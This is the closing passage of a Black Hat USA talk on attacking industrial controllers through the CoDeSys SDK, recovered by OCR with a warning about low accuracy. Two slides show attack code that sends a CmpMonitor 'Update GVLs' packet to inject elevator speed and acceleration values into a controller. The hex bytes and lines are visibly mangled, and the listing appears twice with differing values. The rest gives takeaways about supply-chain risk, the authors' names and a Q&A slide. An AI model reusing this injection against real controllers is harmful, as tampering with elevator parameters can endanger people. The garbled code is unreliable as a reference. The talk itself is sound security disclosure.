#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA @Oe&s5 GVL Update Attack
gl, Ll, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST, ©
@x1B, # CmpMonito
0x62, # Update GVLs
=DEFAULT_NETMASK)
first_part = bytearray([0x01, 0x94, 0x80, 9x00, })
second_part = bytear
8x68, 6x08, 6x17,
8x04,
8x60, 6x88, 6x17,
al += first_part + application_session_id + application_identification_data + second_part
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
resp is None:
print('[>] G1ND1L4: failed received answer for GVL injection’)
else:
print(
*[>] G1ND1L4: Successfully injected GVL varaibles (Elevator Speed=10000, Acceleration=20000, Declaration=20000)!!!!!!')
```

## Slide 171

### GVL Update Attack

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA @Oe&s5 GVL Update Attack
gl, Ll, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST, ©
@x1B, # CmpMonito
0x62, # Update GVLs
=DEFAULT_NETMASK)
first_part = bytearray([0x01, 0x94, 0x80, 9x00, })
second_part = bytear
8x68, 6x08, 6x17,
8x04,
8x66, 0x88, 6x17,
8x84,
al += first_part + application_session_id + application_identification_data + second_part
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
resp is None:
print('[>] G1ND1L4: failed received answer for GVL injection’)
else:
print(
‘[>] G1ND1L4: Successfully injected GVL varaibles (Elevator Speed=10000, Acceleration=20008, Declaration=20 mit)
```

## Slide 172

### The Actual Demo Movie

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 67/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LUISA @& The Actual Demo Movie ~ ll a
```

## Slide 173

### Key Takeaways

- Developers Should be careful when using existing API (“even the best written code becomes vulnerable if used wrong”);

#BHUSA  @BlackHatEvents

## Slide 174

### Key Takeaways

- Critical Infrastructure Attacks via supply chain (aka Vulnerable SDK) should be addressed as critical attack vector by relevant parties and mitigated accordingly.

#BHUSA  @BlackHatEvents

## Slide 175

### Key Takeaways

• CoDeSys SDK is a powerful and critical attack vector.

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
Key Takeaways al ee
¢ CoDeSys SDK is a powerful and critical attack vector.
```

## Slide 176

Thanks

### Sergei Ravicovich Mayan Shaul Omri Ben Bassat Gil Regev

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LISA &@ Thanks
Sergei Ravicovich
Mayan Shaul
Omri Ben Bassat
Gil Regev
```

## Slide 177

Q&A

?

#BHUSA  @BlackHatEvents
